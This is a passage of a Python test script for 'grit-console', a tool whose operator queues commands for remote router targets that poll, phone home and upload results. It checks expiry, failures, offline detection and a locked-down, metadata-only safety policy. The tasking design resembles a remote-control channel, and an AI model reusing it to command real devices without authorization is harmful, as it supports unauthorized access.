                queue_summary.get("commands_by_expired", {}).get("false", [{}])[0].get("id") != queued_id or
                queue_summary.get("timeout_sec_counts", {}).get("9") != 1 or
                queue_summary.get("max_output_bytes_counts", {}).get("1234") != 1 or
                queue_summary.get("expire_sec_counts", {}).get("0") != 1 or
                queue_summary.get("expired_counts", {}).get("False") != 1 or
                queue_summary.get("commands_by_queue_policy_enabled", {}).get("false", [{}])[0].get("id") != queued_id or
                queue_summary.get("commands_by_queue_policy_valid", {}).get("true", [{}])[0].get("id") != queued_id or
                queue_summary.get("commands_by_queue_policy_execution_mode", {}).get("metadata-only", [{}])[0].get("id") != queued_id or
                queue_summary.get("commands_by_queue_policy_allowed_commands", {}).get("none", [{}])[0].get("id") != queued_id or
                queue_summary.get("queue_policy_enabled_counts", {}).get("false") != 1 or
                queue_summary.get("queue_policy_valid_counts", {}).get("true") != 1 or
                queue_summary.get("queue_policy_execution_mode_counts", {}).get("metadata-only") != 1 or
                queue_summary.get("queue_policy_allowed_commands_counts", {}).get("none") != 1 or
                queue_summary.get("latest_created_at") != queue_summary["commands"][0].get("created_at") or
                queue_summary.get("latest_result_received_at") != ""):
            print("json command queue listing missing command lookup indexes", file=sys.stderr)
            print(queue_list.stdout, file=sys.stderr)
            return 1
        if (queued_policy.get("enabled") is not False or
                queued_policy.get("valid") is not True or
                queued_policy.get("allowed_commands") != "none" or
                queued_policy.get("execution_mode") != "metadata-only" or
                queued_policy.get("execution_supported") is not False or
                queued_policy.get("executes_commands") is not False or
                queued_policy.get("delivery_supported") is not False or
                queued_policy.get("result_upload_supported") is not True or
                queued_policy.get("active_control_channel") is not False or
                queued_policy.get("arbitrary_execution_allowed") is not False or
                queued_policy.get("operator_queue_records_only") is not True):
            print("queued command missing policy snapshot", file=sys.stderr)
            print(queue_list.stdout, file=sys.stderr)
            return 1

        expired_port = free_port()
        expired_dir = Path(tmp) / "operator-session-command-expired"
        expired_queue_file = expired_dir / "command-queue.json"
        expired_result_file = Path(tmp) / "expired-result.json"
        expired_cfg = Path(tmp) / "server-config-command-expired.json"
        expired_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(expired_dir),
            "command_queue_file": str(expired_queue_file),
            "GRIT_COMMAND_QUEUE_ENABLE": "yes",
            "GRIT_COMMAND_QUEUE_TLS": "no",
            "GRIT_COMMAND_QUEUE_PORT": str(expired_port),
            "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "no",
            "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "grit-only",
            "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "no",
        }), encoding="utf-8")
        expired_label = run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--set-target-label", "target-expired",
            "--target-label", "Expired Router",
        )
        if expired_label.returncode != 0:
            print("expired command target label setup failed", file=sys.stderr)
            print(expired_label.stderr, file=sys.stderr)
            return 1
        expired_queue = run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--target-id", "target-expired",
            "--queue-command", "grit survey --json",
            "--queue-expire-sec", "1",
        )
        if expired_queue.returncode != 0:
            print("expired command queue setup failed", file=sys.stderr)
            print(expired_queue.stdout, file=sys.stderr)
            print(expired_queue.stderr, file=sys.stderr)
            return 1
        expired_doc = json.loads(expired_queue_file.read_text(encoding="utf-8"))
        expired_id = expired_doc["commands"][0]["id"]
        expired_doc["commands"][0]["created_at"] = "2000-01-01T00:00:00Z"
        expired_doc["commands"][0]["expires_at"] = "2000-01-01T00:00:01Z"
        expired_queue_file.write_text(json.dumps(expired_doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        expired_status = json.loads(run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--json-status",
        ).stdout)
        expired_command = (expired_status.get("command_queue") or {}).get("commands_by_id", {}).get(expired_id) or {}
        expired_mailbox = (expired_status.get("target_mailbox_records_by_command_id") or {}).get(expired_id) or {}
        expired_target = (expired_status.get("targets_by_id") or {}).get("target-expired") or {}
        if (expired_command.get("status") != "expired" or
                expired_command.get("expired") is not True or
                expired_mailbox.get("status") != "expired" or
                expired_mailbox.get("expired") is not True or
                expired_mailbox.get("waiting_for") != "none" or
                expired_mailbox.get("pending_work") is not False or
                expired_target.get("mailbox_expired_command_count") != 1 or
                expired_target.get("mailbox_pending_work_count") != 0 or
                expired_status.get("summary", {}).get("command_queue_status_counts", {}).get("expired") != 1 or
                expired_status.get("summary", {}).get("command_queue_expired_counts", {}).get("True") != 1 or
                expired_status.get("summary", {}).get("target_mailbox_status_counts", {}).get("expired") != 1 or
                expired_status.get("summary", {}).get("target_mailbox_expired_counts", {}).get("True") != 1 or
                ((expired_status.get("commands_by_expired") or {}).get("true") or [{}])[0].get("id") != expired_id or
                ((expired_status.get("target_mailbox_records_by_expired") or {}).get("True") or [{}])[0].get("command_id") != expired_id or
                "commands_by_expired" not in ((expired_status.get("api_collections") or {}).get("command_queue_commands") or {}).get("indexes", []) or
                "target_mailbox_records_by_expired" not in ((expired_status.get("api_collections") or {}).get("target_mailbox_records") or {}).get("indexes", [])):
            print("expired command queue entry missing mailbox/API state", file=sys.stderr)
            print(json.dumps(expired_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        expired_poll_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(expired_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        expired_poll_response = connect_with_retry(expired_port, (
            b"GET /command-queue/poll HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"X-Grit-Target-Id: target-expired\r\n"
            b"X-Grit-Target-Label: Expired Router\r\n"
            b"Connection: close\r\n\r\n"
        ))
        expired_poll_stdout, expired_poll_stderr = expired_poll_server.communicate(timeout=15)
        if (expired_poll_server.returncode != 0 or
                b"HTTP/1.1 204 No Content" not in expired_poll_response or
                expired_id.encode("ascii") in expired_poll_response):
            print("expired target command should not be delivered on poll", file=sys.stderr)
            print(expired_poll_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(expired_poll_stdout, file=sys.stderr)
            print(expired_poll_stderr, file=sys.stderr)
            return 1
        expired_result_file.write_text(json.dumps({
            "schema": 1,
            "command_id": expired_id,
            "status": "completed",
            "exit_code": 0,
        }) + "\n", encoding="utf-8")
        expired_result = run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--record-command-result", expired_id,
            "--result-json", str(expired_result_file),
        )
        if expired_result.returncode == 0 or "command queue id expired" not in expired_result.stderr:
            print("expired command accepted a late result", file=sys.stderr)
            print(expired_result.stdout, file=sys.stderr)
            print(expired_result.stderr, file=sys.stderr)
            return 1

        failed_label = run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--set-target-label", "target-failed",
            "--target-label", "Failed Router",
        )
        if failed_label.returncode != 0:
            print("failed command target label setup failed", file=sys.stderr)
            print(failed_label.stderr, file=sys.stderr)
            return 1
        failed_queue = run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--target-id", "target-failed",
            "--queue-command", "grit survey --json",
        )
        if failed_queue.returncode != 0:
            print("failed command queue setup failed", file=sys.stderr)
            print(failed_queue.stdout, file=sys.stderr)
            print(failed_queue.stderr, file=sys.stderr)
            return 1
        failed_doc = json.loads(expired_queue_file.read_text(encoding="utf-8"))
        failed_id = next(rec["id"] for rec in failed_doc["commands"] if rec.get("target_id") == "target-failed")
        failed_poll_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(expired_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        failed_poll_response = connect_with_retry(expired_port, (
            b"GET /command-queue/poll HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"X-Grit-Target-Id: target-failed\r\n"
            b"X-Grit-Target-Label: Failed Router\r\n"
            b"Connection: close\r\n\r\n"
        ))
        failed_poll_stdout, failed_poll_stderr = failed_poll_server.communicate(timeout=15)
        if (failed_poll_server.returncode != 0 or
                b"HTTP/1.1 200 OK" not in failed_poll_response or
                failed_id.encode("ascii") not in failed_poll_response):
            print("failed target command was not delivered before failed result", file=sys.stderr)
            print(failed_poll_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(failed_poll_stdout, file=sys.stderr)
            print(failed_poll_stderr, file=sys.stderr)
            return 1
        failed_result = json.dumps({
            "schema": 1,
            "command_id": failed_id,
            "status": "failed",
            "exit_code": 23,
            "stdout_bytes": 0,
            "stderr_bytes": 11,
        }).encode("utf-8")
        failed_result_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(expired_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        failed_result_response = connect_with_retry(expired_port, (
            b"POST /command-queue/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"X-Grit-Target-Id: target-failed\r\n"
            b"X-Grit-Target-Label: Failed Router\r\n"
            b"Content-Length: " + str(len(failed_result)).encode("ascii") + b"\r\n"
            b"Connection: close\r\n\r\n" + failed_result
        ))
        failed_result_stdout, failed_result_stderr = failed_result_server.communicate(timeout=15)
        if (failed_result_server.returncode != 0 or
                b"HTTP/1.1 200 OK" not in failed_result_response or
                b'"result_status": "failed"' not in failed_result_response):
            print("failed target command result upload failed", file=sys.stderr)
            print(failed_result_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(failed_result_stdout, file=sys.stderr)
            print(failed_result_stderr, file=sys.stderr)
            return 1
        failed_expired_status = json.loads(run(
            "scripts/grit-console", "--config", str(expired_cfg),
            "--json-status",
        ).stdout)
        failed_mailbox = (failed_expired_status.get("target_mailbox_records_by_command_id") or {}).get(failed_id) or {}
        if (failed_mailbox.get("status") != "result-received" or
                failed_mailbox.get("result_status") != "failed" or
                failed_mailbox.get("result_exit_code") != 23 or
                failed_expired_status.get("summary", {}).get("target_mailbox_result_status_counts", {}).get("failed") != 1 or
                ((failed_expired_status.get("target_mailbox_records_by_result_status") or {}).get("failed") or [{}])[0].get("command_id") != failed_id):
            print("failed command result missing mailbox/API state", file=sys.stderr)
            print(json.dumps(failed_expired_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        lifecycle_tui_master, lifecycle_tui_slave = pty.openpty()
        try:
            lifecycle_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(expired_cfg),
                ],
                cwd=ROOT,
                stdin=lifecycle_tui_slave,
                stdout=lifecycle_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(lifecycle_tui_slave)
            lifecycle_tui_slave = -1
            time.sleep(0.5)
            os.write(lifecycle_tui_master, b"20\nq\n")
            _lifecycle_tui_stdout, lifecycle_tui_stderr = lifecycle_tui_proc.communicate(timeout=8)
            lifecycle_tui_output = b""
            while True:
                try:
                    chunk = os.read(lifecycle_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                lifecycle_tui_output += chunk
        finally:
            if lifecycle_tui_slave != -1:
                os.close(lifecycle_tui_slave)
            try:
                os.close(lifecycle_tui_master)
            except OSError:
                pass
        lifecycle_tui_text = lifecycle_tui_output.decode("utf-8", errors="replace")
        if (lifecycle_tui_proc.returncode != 0 or
                "Traceback" in (lifecycle_tui_stderr or "") or
                "Mailbox  (" not in lifecycle_tui_text or
                expired_id not in lifecycle_tui_text or
                "target-expired" not in lifecycle_tui_text or
                "expired" not in lifecycle_tui_text or
                failed_id not in lifecycle_tui_text or
                "target-failed" not in lifecycle_tui_text or
                "result-received" not in lifecycle_tui_text or
                "failed/23" not in lifecycle_tui_text):
            print("line console command queue inspection missing failed/expired lifecycle state", file=sys.stderr)
            print(lifecycle_tui_text, file=sys.stderr)
            print(lifecycle_tui_stderr or "", file=sys.stderr)
            return 1
        if (queue_summary.get("enabled") != "no" or
                queue_summary.get("default_enabled") is not False or
                queue_summary.get("allowed_commands") != "none" or
                queue_summary.get("execution_mode") != "metadata-only" or
                queue_summary.get("metadata_only_default") is not True or
                queue_summary.get("allow_arbitrary") != "no" or
                queue_summary.get("policy_valid") is not True or
                queue_summary.get("policy_errors") != [] or
                queue_summary.get("arbitrary_policy_requested") is not False or
                queue_summary.get("arbitrary_execution_allowed") is not False or
                queue_summary.get("poll_interval_sec") != "5" or
                queue_summary.get("poll_jitter_pct") != "0" or
                queue_summary.get("poll_backoff") != "none" or
                queue_summary.get("poll_max_interval_sec") != "300" or
                queue_summary.get("max_polls") != "0" or
                queue_summary.get("poll_transport_supported") is not False or
                queue_summary.get("live_polling_supported") is not False or
                "requires GRIT_COMMAND_QUEUE_TLS=no" not in queue_summary.get("poll_transport_unsupported_reason", "") or
                queue_summary.get("delivery_supported") is not False or
                queue_summary.get("result_upload_supported") is not True or
                queue_summary.get("executes_commands") is not False or
                queue_summary.get("operator_queue_records_only") is not True or
                queue_summary.get("active_control_channel") is not False):
            print("json command queue listing missing explicit safety policy", file=sys.stderr)
            print(queue_list.stdout, file=sys.stderr)
            return 1
        queue_policy_summary = queue_summary.get("policy_summary") or {}
        if (queue_policy_summary.get("safe_disabled_default") is not True or
                queue_policy_summary.get("operator_queue_records_only") is not True or
                queue_policy_summary.get("execution_mode") != "metadata-only" or
                queue_policy_summary.get("metadata_only_default") is not True or
                queue_policy_summary.get("execution_supported") is not False or
                queue_policy_summary.get("result_upload_supported") is not True or
                queue_policy_summary.get("poll_transport_supported") is not False or
                queue_policy_summary.get("live_polling_supported") is not False or
                "requires GRIT_COMMAND_QUEUE_TLS=no" not in queue_policy_summary.get("poll_transport_unsupported_reason", "") or
                queue_policy_summary.get("poll_interval_sec") != "5" or
                queue_policy_summary.get("poll_jitter_pct") != "0" or
                queue_policy_summary.get("poll_backoff") != "none" or
                queue_policy_summary.get("poll_max_interval_sec") != "300" or
                queue_policy_summary.get("max_polls") != "0" or
                queue_policy_summary.get("active_control_channel") is not False or
                queue_policy_summary.get("error_count") != 0):
            print("json command queue listing missing compact policy summary", file=sys.stderr)
            print(queue_list.stdout, file=sys.stderr)
            return 1
        queue_modes = queue_summary.get("mode_semantics") or {}
        queue_mode_summary = queue_summary.get("mode_summary") or {}
        if (queue_modes.get("status", {}).get("lifecycle") != "inspect" or
                queue_modes.get("poll", {}).get("lifecycle") != "single-poll" or
                queue_modes.get("once", {}).get("lifecycle") != "single-cycle" or
                queue_modes.get("daemon", {}).get("lifecycle") != "long-running" or
                queue_modes.get("stop", {}).get("lifecycle") != "stop" or
                queue_modes.get("stop", {}).get("requires_operator_host") is not False or
                queue_modes.get("stop", {}).get("would_poll_if_configured") is not False or
                queue_modes.get("daemon", {}).get("dry_run_default") is not True or
                queue_modes.get("daemon", {}).get("dry_run_only") is not True or
                queue_modes.get("daemon", {}).get("live_supported") is not False or
                queue_modes.get("daemon", {}).get("live_transport_supported") is not False or
                "requires GRIT_COMMAND_QUEUE_TLS=no" not in queue_modes.get("daemon", {}).get("live_transport_unsupported_reason", "") or
                queue_modes.get("daemon", {}).get("live_would_contact_operator") is not False or
                queue_modes.get("daemon", {}).get("execution_supported") is not False or
                queue_modes.get("daemon", {}).get("active_control_channel") is not False or
                queue_mode_summary.get("mode_count") != 5 or
                queue_mode_summary.get("polling_mode_count") != 3 or
                queue_mode_summary.get("live_supported_mode_count") != 0 or
                queue_mode_summary.get("result_upload_supported_mode_count") != 5 or
                queue_mode_summary.get("execution_supported_mode_count") != 0):
            print("json command queue listing missing mode semantics", file=sys.stderr)
            print(queue_list.stdout, file=sys.stderr)
            return 1
        invalid_queue_cfg = Path(tmp) / "server-config-invalid-command-queue.json"
        invalid_queue_cfg.write_text(json.dumps({
            "operator_session_dir": str(queue_operator_dir),
            "command_queue_file": str(queue_file),
            "GRIT_COMMAND_QUEUE_ENABLE": "no",
            "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "grit-only",
            "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "yes",
        }), encoding="utf-8")
        invalid_queue_list = run(
            "scripts/grit-console",
            "--config", str(invalid_queue_cfg),
            "--json-command-queue",
        )
        if invalid_queue_list.returncode != 0:
            print("invalid command queue policy listing failed", file=sys.stderr)
            print(invalid_queue_list.stderr, file=sys.stderr)
            return 1
        invalid_queue_summary = json.loads(invalid_queue_list.stdout)["command_queue"]
        invalid_queue_policy_summary = invalid_queue_summary.get("policy_summary") or {}
        if (invalid_queue_summary.get("policy_valid") is not False or
                "disabled command queue must keep allowed commands policy none" not in invalid_queue_summary.get("policy_errors", []) or
                "disabled command queue must not allow arbitrary execution" not in invalid_queue_summary.get("policy_errors", []) or
                invalid_queue_summary.get("configured_for_polling") is not False or
                invalid_queue_summary.get("arbitrary_policy_requested") is not False or
                invalid_queue_summary.get("arbitrary_execution_allowed") is not False or
                invalid_queue_summary.get("active_control_channel") is not False or
                invalid_queue_summary.get("executes_commands") is not False or
                invalid_queue_policy_summary.get("valid") is not False or
                invalid_queue_policy_summary.get("safe_disabled_default") is not False or
                invalid_queue_policy_summary.get("error_count") != len(invalid_queue_summary.get("policy_errors", []))):
            print("invalid command queue policy was not reported safely", file=sys.stderr)
            print(invalid_queue_list.stdout, file=sys.stderr)
            return 1
        invalid_queue_text = run(
            "scripts/grit-console",
            "--config", str(invalid_queue_cfg),
            "--list-command-queue",
        )
        if (invalid_queue_text.returncode != 0 or
                "policy_valid=no" not in invalid_queue_text.stdout or
                "arbitrary_execution_allowed=no" not in invalid_queue_text.stdout or
                "modes: total=5 would_poll_if_configured=3 operator_host_required=3 delivery_supported=0 result_upload_supported=5 execution_supported=0 active_control_channel=0" not in invalid_queue_text.stdout or
                "mode daemon: lifecycle=long-running requires_operator_host=yes would_poll_if_configured=yes execution_supported=no active_control_channel=no" not in invalid_queue_text.stdout or
                "mode stop: lifecycle=stop requires_operator_host=no would_poll_if_configured=no execution_supported=no active_control_channel=no" not in invalid_queue_text.stdout or
                "policy_error=disabled command queue must keep allowed commands policy none" not in invalid_queue_text.stdout):
            print("invalid command queue text listing missing policy errors", file=sys.stderr)
            print(invalid_queue_text.stdout, file=sys.stderr)
            print(invalid_queue_text.stderr, file=sys.stderr)
            return 1
        command_id = queue_status["command_queue"]["commands"][0]["id"]
        mismatched_result_json = Path(tmp) / "command-result-mismatch.json"
        mismatched_result_json.write_text(json.dumps({
            "schema": 1,
            "command_id": "cq-wrong",
            "status": "completed",
            "exit_code": 0,
        }) + "\n", encoding="utf-8")
        mismatched_result = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--record-command-result", command_id,
            "--result-json", str(mismatched_result_json),
        )
        if mismatched_result.returncode == 0 or "command result id mismatch" not in mismatched_result.stderr:
            print("operator command queue accepted mismatched result id", file=sys.stderr)
            print(mismatched_result.stdout, file=sys.stderr)
            print(mismatched_result.stderr, file=sys.stderr)
            return 1
        queue_after_mismatch = json.loads(queue_file.read_text(encoding="utf-8"))
        if queue_after_mismatch["commands"][0].get("status") != "queued":
            print("mismatched command result changed queue state", file=sys.stderr)
            return 1
        result_json = Path(tmp) / "command-result.json"
        result_json.write_text(json.dumps({
            "schema": 1,
            "command_id": command_id,
            "status": "completed",
            "exit_code": 0,
            "stdout_bytes": 12,
            "stderr_bytes": 0,
        }) + "\n", encoding="utf-8")
        recorded_result = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--record-command-result", command_id,
            "--result-json", str(result_json),
        )
        if recorded_result.returncode != 0 or "recorded result" not in recorded_result.stdout:
            print("operator command queue result was not recorded", file=sys.stderr)
            print(recorded_result.stdout, file=sys.stderr)
            print(recorded_result.stderr, file=sys.stderr)
            return 1
        queue_after_result = json.loads(queue_file.read_text(encoding="utf-8"))
        command_after_result = queue_after_result["commands"][0]
        if (command_after_result.get("status") != "result-received" or
                command_after_result.get("result", {}).get("exit_code") != 0 or
                command_after_result.get("result_command_id") != command_id or
                not command_after_result.get("result_received_at") or
                command_after_result.get("result_output_bytes") != 12 or
                command_after_result.get("result_output_limit_bytes") != 1234 or
                command_after_result.get("result_output_exceeded_limit") is not False):
            print("operator command queue result metadata missing", file=sys.stderr)
            return 1
        event_log = queue_operator_dir / "events.jsonl"
        result_events = [
            json.loads(line) for line in event_log.read_text(encoding="utf-8").splitlines()
            if "command_result_received" in line
        ]
        if (not result_events or
                result_events[-1].get("details", {}).get("command_id") != command_id or
                result_events[-1].get("details", {}).get("output_bytes") != 12 or
                result_events[-1].get("details", {}).get("output_limit_bytes") != 1234 or
                result_events[-1].get("details", {}).get("output_exceeded_limit") is not False):
            print("operator command queue result event missing command id", file=sys.stderr)
            return 1

        result_port = free_port()
        http_queue_dir = Path(tmp) / "operator-session-command-result-http"
        http_queue_file = http_queue_dir / "command-queue.json"
        http_result_cfg = Path(tmp) / "server-config-command-result-http.json"
        http_result_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(http_queue_dir),
            "command_queue_file": str(http_queue_file),
            "GRIT_COMMAND_QUEUE_ENABLE": "yes",
            "GRIT_COMMAND_QUEUE_TLS": "no",
            "GRIT_COMMAND_QUEUE_PORT": str(result_port),
            "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "no",
            "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "grit-only",
            "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "no",
        }), encoding="utf-8")
        http_queued = run(
            "scripts/grit-console",
            "--config", str(http_result_cfg),
            "--queue-command", "grit survey --json",
            "--queue-timeout", "3",
            "--queue-max-output", "10",
        )
        if http_queued.returncode != 0:
            print("http result queue command setup failed", file=sys.stderr)
            print(http_queued.stderr, file=sys.stderr)
            return 1
        http_command_id = json.loads(http_queue_file.read_text(encoding="utf-8"))["commands"][0]["id"]
        http_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(http_result_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        http_result = json.dumps({
            "schema": 1,
            "command_id": http_command_id,
            "status": "completed",
            "exit_code": 7,
            "stdout_bytes": 9,
            "stderr_bytes": 2,
        }).encode("utf-8")
        request = (
            b"POST /command-queue/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(http_result)).encode("ascii") + b"\r\n"
            b"Connection: close\r\n\r\n" + http_result
        )
        response = connect_with_retry(result_port, request)
        http_stdout, http_stderr = http_server.communicate(timeout=15)
        if http_server.returncode != 0 or b"HTTP/1.1 200 OK" not in response or b'"status": "result-received"' not in response:
            print("command queue HTTP result upload failed", file=sys.stderr)
            print(response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(http_stdout, file=sys.stderr)
            print(http_stderr, file=sys.stderr)
            return 1
        http_queue = json.loads(http_queue_file.read_text(encoding="utf-8"))
        http_command = http_queue["commands"][0]
        if (http_command.get("status") != "result-received" or
                http_command.get("result", {}).get("exit_code") != 7 or
                http_command.get("result_output_bytes") != 11 or
                http_command.get("result_output_limit_bytes") != 10 or
                http_command.get("result_output_exceeded_limit") is not True or
                not str(http_command.get("result_source_path", "")).startswith("http:")):
            print("command queue HTTP result metadata missing", file=sys.stderr)
            print(json.dumps(http_command, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        http_events = [
            json.loads(line)
            for line in (http_queue_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if (not any(event.get("event") == "command_result_received" and event.get("details", {}).get("command_id") == http_command_id for event in http_events) or
                not any(event.get("event") == "command_queue_result_upload" and event.get("details", {}).get("result_output_exceeded_limit") is True for event in http_events)):
            print("command queue HTTP result events missing", file=sys.stderr)
            return 1

        poll_target_port = free_port()
        poll_target_dir = Path(tmp) / "operator-session-command-poll-target"
        poll_target_queue_file = poll_target_dir / "command-queue.json"
        poll_target_cfg = Path(tmp) / "server-config-command-poll-target.json"
        poll_target_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(poll_target_dir),
            "command_queue_file": str(poll_target_queue_file),
            "GRIT_COMMAND_QUEUE_ENABLE": "yes",
            "GRIT_COMMAND_QUEUE_TLS": "no",
            "GRIT_COMMAND_QUEUE_PORT": str(poll_target_port),
            "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "no",
            "GRIT_COMMAND_QUEUE_ALLOWED_COMMANDS": "grit-only",
            "GRIT_COMMAND_QUEUE_ALLOW_ARBITRARY": "no",
        }), encoding="utf-8")
        for target_id, label in (("target-bravo", "Bravo Router"), ("target-alpha", "Alpha Router")):
            labeled = run(
                "scripts/grit-console", "--config", str(poll_target_cfg),
                "--set-target-label", target_id,
                "--target-label", label,
            )
            if labeled.returncode != 0:
                print("command queue target label setup failed", file=sys.stderr)
                print(labeled.stderr, file=sys.stderr)
                return 1
            queued_target = run(
                "scripts/grit-console", "--config", str(poll_target_cfg),
                "--target-id", target_id,
                "--queue-command", f"grit survey --target {target_id}",
            )
            if queued_target.returncode != 0:
                print("target-scoped command queue setup failed", file=sys.stderr)
                print(queued_target.stdout, file=sys.stderr)
                print(queued_target.stderr, file=sys.stderr)
                return 1
        poll_before = json.loads(poll_target_queue_file.read_text(encoding="utf-8"))
        alpha_id = next(rec["id"] for rec in poll_before["commands"] if rec.get("target_id") == "target-alpha")
        bravo_id = next(rec["id"] for rec in poll_before["commands"] if rec.get("target_id") == "target-bravo")
        poll_targets_file = poll_target_dir / "targets.json"
        poll_targets = json.loads(poll_targets_file.read_text(encoding="utf-8"))
        old_seen = "2000-01-01T00:00:00Z"
        poll_targets["targets"]["target-bravo"].update({
            "last_seen_at": old_seen,
            "latest_activity_at": old_seen,
            "latest_activity_service": "command-queue",
            "latest_activity_operation": "command_queue_poll",
            "latest_command_queue_poll_interval_sec": "11",
            "remote_addresses": ["198.51.100.10:12345"],
            "services_seen": ["command-queue"],
        })
        poll_targets_file.write_text(json.dumps(poll_targets, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        anonymous_poll_server = subprocess.Popen(
            ["scripts/grit-console", "--config", str(poll_target_cfg), "--transport", "command-queue", "--timeout", "10", "--one-shot"],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        anonymous_poll_response = connect_with_retry(poll_target_port, (
            b"GET /command-queue/poll HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Connection: close\r\n\r\n"
        ))
        anonymous_stdout, anonymous_stderr = anonymous_poll_server.communicate(timeout=15)
        anonymous_after = json.loads(poll_target_queue_file.read_text(encoding="utf-8"))
        if (anonymous_poll_server.returncode != 0 or
                b"HTTP/1.1 204 No Content" not in anonymous_poll_response or
                any(rec.get("status") != "queued" for rec in anonymous_after["commands"])):
            print("anonymous command queue poll should not receive target-scoped commands", file=sys.stderr)
            print(anonymous_poll_response.decode("utf-8", errors="replace"), file=sys.stderr)
            print(anonymous_stdout, file=sys.stderr)
            print(anonymous_stderr, file=sys.stderr)
            return 1
        alpha_before_reconnect = next(rec for rec in anonymous_after["commands"] if rec.get("id") == alpha_id)
        if alpha_before_reconnect.get("status") != "queued":
            print("target-scoped command should remain queued while its target is offline", file=sys.stderr)
            print(json.dumps(anonymous_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        offline_status = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--json-status",
        ).stdout)
        offline_bravo = (offline_status.get("targets_by_id") or {}).get("target-bravo") or {}
        offline_bravo_mailbox = (offline_status.get("target_mailbox_records_by_command_id") or {}).get(bravo_id) or {}
        anonymous_phone_home = [
            rec for rec in offline_status.get("target_phone_home_records") or []
            if rec.get("anonymous") is True and rec.get("status") == "no-command"
        ]
        if (offline_bravo.get("connectivity_state") != "offline" or
                offline_bravo.get("mailbox_pending_work_count") != 1 or
                offline_bravo.get("last_seen") != old_seen or
                offline_bravo.get("last_seen_via") != "command-queue:command_queue_poll" or
                offline_bravo.get("poll_overdue") is not True or
                not isinstance(offline_bravo.get("poll_overdue_for_sec"), int) or
                offline_bravo_mailbox.get("waiting_for") != "target-poll" or
                offline_bravo_mailbox.get("pending_reason") != "target-poll-overdue" or
                offline_bravo_mailbox.get("has_pending_reason") is not True or
                offline_bravo_mailbox.get("target_offline_age_bucket") != "day-plus" or
                offline_bravo_mailbox.get("target_poll_overdue") is not True or
                not isinstance(offline_bravo_mailbox.get("target_poll_overdue_for_sec"), int) or
                not isinstance(offline_bravo_mailbox.get("age_sec"), int) or
                not isinstance(offline_bravo_mailbox.get("pending_delivery_for_sec"), int) or
                not anonymous_phone_home or
                anonymous_phone_home[0].get("queued_remaining_count") != 2 or
                anonymous_phone_home[0].get("pending_work_remaining") is not True or
                anonymous_phone_home[0].get("has_queued_remaining_count") is not True or
                offline_status.get("summary", {}).get("target_mailbox_waiting_for_counts", {}).get("target-poll") != 2 or
                offline_status.get("summary", {}).get("target_mailbox_pending_reason_counts", {}).get("target-poll-overdue") != 1 or
                offline_status.get("summary", {}).get("target_mailbox_has_pending_reason_counts", {}).get("True") != 2 or
                offline_status.get("summary", {}).get("target_phone_home_queued_remaining_count_counts", {}).get("2") != 1 or
                offline_status.get("summary", {}).get("target_phone_home_pending_work_remaining_counts", {}).get("True") != 1 or
                ((offline_status.get("target_mailbox_records_by_waiting_for") or {}).get("target-poll") or [{}])[0].get("target_id") not in {"target-alpha", "target-bravo"} or
